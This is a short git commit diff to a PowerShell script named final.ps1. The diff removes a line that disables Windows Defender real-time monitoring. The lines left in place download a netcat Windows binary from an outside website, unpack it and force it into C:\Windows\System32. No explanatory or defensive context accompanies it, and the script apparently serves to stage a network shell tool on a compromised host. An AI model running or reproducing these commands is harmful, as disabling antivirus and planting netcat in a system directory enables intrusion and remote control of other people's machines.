df119879aa1cb8d58e5fd39c193f680bf38ebafb
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-03 15:45:06 -0700

    Update final.ps1

--- final.ps1
+++ final.ps1
@@ -1,4 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
 (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
 Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
 Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
